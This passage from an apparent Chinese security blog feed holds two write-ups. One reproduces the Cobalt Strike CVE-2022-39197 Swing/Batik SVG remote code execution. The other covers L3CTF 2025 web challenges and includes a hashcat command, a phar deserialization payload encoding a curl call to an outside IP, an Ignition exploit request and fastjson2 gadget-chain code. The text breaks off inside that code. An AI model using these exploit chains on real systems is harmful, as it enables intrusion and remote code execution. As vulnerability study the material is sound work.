      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-39197 CS RCE</title>
      <link href="/2025/10/02/CVE-2022-39197-CS-RCE/"/>
      <url>/2025/10/02/CVE-2022-39197-CS-RCE/</url>
      
        <content type="html"><![CDATA[<p>影响范围：</p><ul><li>Cobalt Strike &lt;&#x3D; 4.7</li></ul><p>漏洞原文：<a href="https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/">https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/</a></p><h2 id="Swing框架"><a href="#Swing框架" class="headerlink" title="Swing框架"></a>Swing框架</h2><p>这个漏洞本质上是java自带的GUI组件swing的html注入</p><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;  </span><br><span class="line"><span class="keyword">import</span> java.awt.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwingDemo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>(<span class="string">&quot;SwingDemo&quot;</span>);  </span><br><span class="line">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  </span><br><span class="line">        frame.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">400</span>, <span class="number">400</span>));  </span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&lt;html&gt;&lt;img scr=x&gt;&lt;/html&gt;&quot;</span>);  </span><br><span class="line">        frame.getContentPane().add(label);  </span><br><span class="line">        frame.pack();  </span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此demo可解析img标签<br>这个漏洞涉及到的一些类</p><p><code>HTMLEditorKit</code>:    <em><strong>读取、渲染、编辑</strong></em> HTML，是实现功能的“引擎”。<strong>工具&#x2F;控制器</strong> (View-Controller)<br><strong><code>HTMLDocument</code></strong>:      <em><strong>存储</strong></em> HTML 的结构和内容，是数据的“容器”。<strong>数据模型</strong> (Model)<br><strong><code>HTML</code></strong>:                  定义所有 HTML 标签和属性的常量。<strong>常量&#x2F;标识符</strong></p><p>首先就是<code>javax.swing.text.html.HTML</code></p><p>它的静态内部类Tag的静态代码块中实例化了很多标签类<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927192629.png" alt="image.png"></p><p>在<code>javax.swing.text.html.HTMLDocument$HTMLReader</code>中, 为每个tag映射了对应的TagAction</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927193735.png" alt="image.png"><br><code>TagAction</code>定义了<code>start()</code>和<code>end()</code>方法, 对应了每个标签起始和结束都需要做什么</p><p>之后是<code>javax.swing.text.html.HTMLEditorKit$HTMLFactory#create</code><br>此处为不同的 Tag 创建了不同的view视图<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927204931.png" alt="image.png"><br>除了正常的HTML标签之外, 这里还有一个名为<code>OBJECT</code>的标签, 并为其创建了<code>ObjectView</code><br>在它的<code>createComponent</code>方法中, 存在类实例化的操作</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927221351.png" alt="image.png"><br>根据第106行, 被加载的类需要继承<code>java.awt.Component</code><br>根据107行, 被加载的类需要有一个无参构造器</p><p>其中的<code>setParameters</code>中更是存在遍历setter方法调用,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250927221518.png" alt="image.png"><br>根据<code>ObjectView</code>类代码中的文档注释, 其使用方法如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A simple example HTML invocation is:</span><br><span class="line">       &lt;object classid=&quot;javax.swing.JLabel&quot;&gt;</span><br><span class="line">       &lt;param name=&quot;text&quot; value=&quot;sample text&quot;&gt;</span><br><span class="line">       &lt;/object&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>以上条件加起来: </p><ol><li>一个继承于Component的类，其中必须包含无参的构造方法。</li><li>这个类中需要有一个setXXX方法，这个方法必须只接受一个参数，而且可以接受String类型。</li></ol><p>最终作者找到的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.batik.swing.JSVGCanvas--&gt;setURI</span><br></pre></td></tr></table></figure><p>org.apache.batik 来自batik-swing, 也是CS的一个依赖</p><p>我们测试时引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xmlgraphics<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>batik-swing<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>转到这个方法中, 我们发现它可以通过参数url去加载SVG</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929000050.png" alt="image.png"></p><p>这个地方是可以进行RCE的:<br><a href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html">https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html</a></p><p>按照文章中的内容, 构造jar包,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929213325.png" alt="image.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>                </span><br><span class="line">            <span class="tag">&lt;<span class="name">archive</span>&gt;</span>                    </span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span>                        </span><br><span class="line">            <span class="tag">&lt;<span class="name">build-time</span>&gt;</span>$&#123;maven.build.timestamp&#125;<span class="tag">&lt;/<span class="name">build-time</span>&gt;</span>   </span><br><span class="line">                <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span>                    </span><br><span class="line">                <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span>            </span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>       </span><br><span class="line">                 <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>    </span><br><span class="line">                 <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/java-archive&quot;</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://127.0.0.1:8000/POC-1.0-SNAPSHOT.jar&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">text</span>&gt;</span>Static text ...<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>测试demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;  </span><br><span class="line"><span class="keyword">import</span> java.awt.*;  </span><br><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwingDemo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>(<span class="string">&quot;SwingDemo&quot;</span>);  </span><br><span class="line">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  </span><br><span class="line">        frame.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">400</span>, <span class="number">400</span>));  </span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&lt;html&gt;&lt;object classid=&#x27;org.apache.batik.swing.JSVGCanvas&#x27;&gt;&lt;param name=&#x27;URI&#x27; value=&#x27;http://127.0.0.1:8001/evilSVG.svg&#x27;&gt;&lt;/object&gt;&quot;</span>);  </span><br><span class="line">        frame.getContentPane().add(label);  </span><br><span class="line">        frame.pack();  </span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929213834.png" alt="image.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://lorexxar.cn/2022/11/02/cs-xss2rce/">https://lorexxar.cn/2022/11/02/cs-xss2rce/</a><br><a href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html">https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html</a><br><a href="http://www.bmth666.cn/2023/03/22/CVE-2022-39197-CS-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/index.html"># CVE-2022-39197 CS RCE复现分析</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>L3CTF 2025 WEB 复现</title>
      <link href="/2025/09/26/L3CTF-2025-WEB-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/09/26/L3CTF-2025-WEB-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="L3CTF-2025-WEB-复现"><a href="#L3CTF-2025-WEB-复现" class="headerlink" title="L3CTF 2025 WEB 复现"></a><strong>L3CTF 2025 WEB 复现</strong></h1><h2 id="gogogo出发喽"><a href="#gogogo出发喽" class="headerlink" title="gogogo出发喽"></a>gogogo出发喽</h2><p>hashcat爆破密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat.exe -m 3200 -a 0 E:\CTFDoc\2025\L3CTF\hash.txt D:\CyberSecurity\wordlists\fuzzDicts\passwordDict\top6000.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250712162912.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">admin / amdin888</span><br></pre></td></tr></table></figure><p>文件上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/image/base64</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-makefile"><span class="section">Host: 1.95.34.119:41164</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Type: application/json</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Length: 548</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">  </span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">&#123;</span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="string">&quot;data&quot;</span>: <span class="string">&quot;data:image/gif;base64,PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQo9AQAAAQAAABEAAAABAAAAAAAHAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozNDoiSWxsdW1pbmF0ZVxRdWV1ZVxDYWxsUXVldWVkQ2xvc3VyZSI6MTp7czoxMzoiACoAY29ubmVjdGlvbiI7czozMToiY3VybCBodHRwOi8vMTA3LjE0OC43NS4yMDI6MTIzNCI7fX0IAAAAdGVzdC50eHQEAAAANY9yaAQAAAAMfn/YtgEAAAAAAAB0ZXN0fKVdq0XQ8HZBfwIxQeP1z2aInN4CAAAAR0JNQg==&quot;</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/images/_A6oMsyFWyQy5T1kO.gif HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 1.95.34.119:41164</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 1.95.34.119:41164</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#123;&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;usesname&quot;,&quot;viewFile&quot;:&quot;/proc/self/cmdline&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>使用phar反序列化套fast destruct<br><a href="https://eastjun.top/posts/php_unserialize_tricks/">https://eastjun.top/posts/php_unserialize_tricks/</a></p><p>未完工</p><h2 id="Tellmewhy"><a href="#Tellmewhy" class="headerlink" title="Tellmewhy"></a>Tellmewhy</h2><p><a href="https://su-team.cn/posts/e3fd1be7.html#tellmewhy">https://su-team.cn/posts/e3fd1be7.html#tellmewhy</a></p><p>有fastjson2, snakeyaml等依赖<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250915195152.png" alt="image.png"></p><p>HomeController中<code>/baby/why</code>路由存在反序列化点<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250915195330.png" alt="image.png"></p><p><code>MyInputObjectStream</code> 重写了<code>resolveClass</code>, 黑名单过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line"><span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, </span><br><span class="line"><span class="string">&quot;javax.swing.event.EventListenerList&quot;</span>, </span><br><span class="line"><span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>禁了<code>BadAttributeValueExpException</code>这个<code>readObject</code> –&gt; <code>toString</code>的链子<br>fastjson1中有toString –&gt; getter的链子, 同样地, fastjson2中也存在这样的了链子</p><p>fastjson2与fastjson1有所不同 ,在fastjson2中 构造反序列化链触发templates会进入黑名单 [[Fastjson2 与 fastjson1 异同]]<br>[[Fastjson原生反序列化 Gadget分析]]<br>绕过思路是:<br><a href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q">高版本Fastjson在Java原生反序列化中的利用 ### 绕过思路三：使用动态代理</a><br><code>IGNORE_CLASS_HASH_CODES</code>黑名单列表，<code>TemplatesImpl</code>的上层接口<code>javax.xml.transform.Templates</code>并不在其中，而**<code>getOutputProperties</code>方法正是<code>Templates</code>接口定义的方法，于是可用通过动态代理来触发</p><p>题目使用的是solon框架, 没有<code>JdkDynamicAopProxy</code>这些类, 但给出了一个MyProxy, 恰好作为templates的代理<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250916230708.png" alt="image.png"><br>这里MyProxy只能代理<code>MyObject</code>, 不过被代理的对象是由<code>this.myObject.getObject()</code>得到, 我们只需要再找到一个代理类, 代理这个<code>MyObject</code>, 当调用它的任意方法时, 返回特定的对象</p><p>所以这里 toString –&gt; getter –&gt; definclass 理论上是通的<br>写个demo测试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyObject;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.tools.ShellCode.getEvilTemplatesImpl;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesNode1</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObjectHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObjectHandler.put(<span class="string">&quot;object&quot;</span>, templatesNode1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObjectOfTemplates</span> <span class="operator">=</span> (MyObject) Proxy.newProxyInstance(jsonObjectHandler.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;MyObject.class&#125;, jsonObjectHandler);  </span><br><span class="line">        System.out.println(myObjectOfTemplates.getObject());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyProxy</span> <span class="variable">myProxyHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyProxy</span>(myObjectOfTemplates);  </span><br><span class="line">        <span class="type">Templates</span> <span class="variable">myProxyTemplates</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(myObjectOfTemplates.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, myProxyHandler);  </span><br><span class="line">  </span><br><span class="line">        myProxyTemplates.getOutputProperties();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">toStringNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        toStringNode.put(<span class="string">&quot;n4c1&quot;</span>, toStringNode);  </span><br><span class="line">        toStringNode.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250923214257.png" alt="image.png"></p><p>没什么问题, 接下来的问题就是 readObject –&gt; toString</p><p>这里尝试用[[tabby]]搜一下</p><p>题目jar包的字节码版本是52.0, 对应java 8<br>修改tabby的配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tabby.build.isJDKProcess</span>                  = <span class="string">true</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># targets to analyse</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.target</span>                        = <span class="string">target</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.libraries</span>                     = <span class="string">libs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.mode</span>                          = <span class="string">gadget</span></span><br></pre></td></tr></table></figure><p>cases目录放题目jar包, libs目录放jdk8u65的rt.jar</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MATCH (source:Method &#123;NAME:<span class="string">&quot;readObject&quot;</span>, CLASSNAME:<span class="string">&quot;java.util.HashMap&quot;</span>&#125;)</span><br><span class="line">MATCH (sink:Method &#123;NAME:<span class="string">&quot;toString&quot;</span>, CLASSNAME:<span class="string">&quot;com.alibaba.fastjson2.JSONArray&quot;</span>&#125;)</span><br><span class="line">CALL apoc.algo.allSimplePaths(source, sink, <span class="string">&quot;CALL&gt;|ALIAS&gt;&quot;</span>, <span class="number">8</span>) YIELD path</span><br><span class="line">WHERE none(n in nodes(path) WHERE n.CLASSNAME IN [</span><br><span class="line">  <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>,</span><br><span class="line">  <span class="string">&quot;javax.swing.event.EventListenerList&quot;</span>,</span><br><span class="line">  <span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span></span><br><span class="line">])</span><br><span class="line">RETURN path LIMIT <span class="number">10</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250925220040.png" alt="image.png"><br>第一次用tabby, 确实可以搜索到[[XString链]]这条链子, 但是其他干扰还是比较多</p><p>找到XString, 这里确实能触发到toStirng</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250925220722.png" alt="image.png"></p><p>据此写出exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> 